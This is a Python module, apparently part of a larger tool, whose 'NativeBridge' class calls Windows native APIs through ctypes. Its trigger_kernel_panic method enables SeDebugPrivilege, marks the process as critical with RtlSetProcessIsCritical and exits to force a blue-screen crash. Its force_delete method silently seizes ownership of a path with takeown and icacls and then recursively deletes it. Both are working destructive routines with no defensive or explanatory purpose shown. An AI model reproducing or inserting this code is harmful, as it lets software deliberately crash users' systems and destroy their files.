import ctypes
import sys
import os
from utils.colors import Colors

class NativeBridge:
    """
    The 'NativeBridge' acts as the C++ hybrid layer.
    It uses ctypes to call Windows NT Native APIs directly.
    """
    def __init__(self):
        try:
            self.ntdll = ctypes.windll.ntdll
            self.user32 = ctypes.windll.user32
            self.kernel32 = ctypes.windll.kernel32
        except:
            self.ntdll = None

    def set_privilege(self, priv_id, enable=True):
        """ Equivalent to C++ RtlAdjustPrivilege """
        if not self.ntdll: return False
        res = self.ntdll.RtlAdjustPrivilege(
            priv_id, 
            1 if enable else 0, 
            0, 
            ctypes.byref(ctypes.c_bool())
        )
        return res == 0

    def trigger_kernel_panic(self):
        """ 
        Native C++ approach: Marks process as critical. 
        Windows crashes the moment the process terminates.
        """
        if not self.ntdll: return
        
        # SeDebugPrivilege = 20
        self.set_privilege(20, True)
        
        # Mark as critical: RtlSetProcessIsCritical(NewValue, OldValue, NeedCheck)
        # 1 = Critical, 0 = Normal
        self.ntdll.RtlSetProcessIsCritical(1, None, 0)
        
        # Exit to trigger the BSOD
        sys.exit(0)

    def force_delete(self, path):
        """ Uses native command strings for hijacking file ownership """
        try:
            os.system(f'takeown /f "{path}" /r /d y >nul 2>&1')
            os.system(f'icacls "{path}" /grant administrators:F /t >nul 2>&1')
            if os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
            else:
                os.remove(path)
            return True
        except:
            return False

native = NativeBridge()
